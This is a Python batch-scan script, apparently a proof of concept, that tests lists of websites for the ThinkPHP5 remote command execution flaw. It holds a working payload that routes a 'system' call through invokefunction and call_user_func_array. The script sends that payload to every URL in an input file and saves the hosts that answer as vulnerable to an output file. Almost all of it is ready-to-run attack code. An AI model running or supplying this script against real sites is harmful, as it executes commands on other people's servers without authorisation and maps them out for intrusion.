"""
_______________#########_______________________
______________############_____________________
______________#############____________________
_____________##__###########___________________
____________###__######_#####__________________
____________###_#######___####_________________
___________###__##########_####________________
__________####__###########_####_______________
________#####___###########__#####_____________
_______######___###_########___#####___________
_______#####___###___########___######_________
______######___###__###########___######_______
_____######___####_##############__######______
____#######__#####################_#######_____
____#######__##############################____
___#######__######_#################_#######___
___#######__######_######_#########___######___
___#######____##__######___######_____######___
___#######________######____#####_____#####____
____######________#####_____#####_____####_____
_____#####________####______#####_____###______
______#####______;###________###______#________
________##_______####________####______________

ThinkPHP5 remote command execution vulnerability batch scan script
"""


import requests
from argparse import ArgumentParser

payload = "/?s=index/\\think\\app/invokefunction" \
          "&function=call_user_func_array" \
          "&vars[0]=system" \
          "&vars[1][]=php%20-r%20%27phpinfo();%27"


def get_urls(file):
    """
    Get the list of attack urls
    Args:
        file: input file root

    Returns:
        <list> urls
    """
    with open(file, "r") as f:
        url_list = [line.strip("\n") for line in f.readlines()]
        return url_list


def run(infile, outfile):
    """
    Try to attack
    Args:
        infile: input file root
        outfile: output file root

    Returns:
        None
    """
    url_list = get_urls(infile)
    for curl in url_list:
        target_url = curl + payload
        try:
            response = requests.get(url=target_url)
            print('[*] Trying to attack the url address is ' + target_url)
            if 'PHP Version' in str(response.text):
                print('[+] Remote code execution vulnerability exists at the target address')
                with open(outfile, 'a') as f:
                    f.write(target_url + '\n')
            else:
                print('[-] There is no remote code execution vulnerability in the target address')
        except:
            print('[!] There has some wrong in the target address')


if __name__ == '__main__':
    parser = ArgumentParser(prog='ThinkPHP5 poc', usage='./batch_scan.py [options: -i] <input file root>',
                            description="The ThinkPHP rce test")

    parser.add_argument("-i", "--input", dest="infile", help="Batch scan path file")
    parser.add_argument("-o", "--output", dest="outfile", default="attack.txt",
                        help="Export a vulnerable website,default is attack.txt")

    args = parser.parse_args()

    bulk_file = args.infile
    out_file = args.outfile
    if not bulk_file or not out_file:
        print(parser.print_help())
    else:
        run(bulk_file, out_file)
